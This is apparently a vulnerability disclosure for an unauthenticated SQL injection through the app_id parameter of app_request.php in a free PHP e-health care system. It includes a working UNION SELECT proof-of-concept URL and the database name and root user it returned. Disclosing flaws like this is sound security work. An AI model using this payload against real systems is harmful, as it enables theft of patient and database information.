# E-Health Care System IN PHP has sql injection vulnerability via app_id parameter.

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
app_request.php
## describe
An unrestricted SQL injection attack exists in an E-Health Care System's . The parameters that can be controlled are as follows: app_id. This function executes the app_id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

## code analysis
The $app_id parameters of the app_request.php are not filtered and concatenated into the SQL statement for execution when attacker is not logining.

![image-20241104225309002](https://github.com/user-attachments/assets/b4855da1-97a1-42ba-b83f-2f8ce9cbac0c)



## POC

Asset the url，can get table_name，database_ name and user. 

```
http://healthcare/Doctor/app_request.php?app_id=1%27%20union%20select%20group_concat(table_name),database(),3,user(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20from%20information_schema.tables%20where%20table_schema=database()--+
```

Get table_name from online_health_care database;

And get databasename：online_health_care

get username: root@localhost

![image-20241104224746017](https://github.com/user-attachments/assets/31c34a1c-491a-41bb-bcf0-6ea58e91bb34)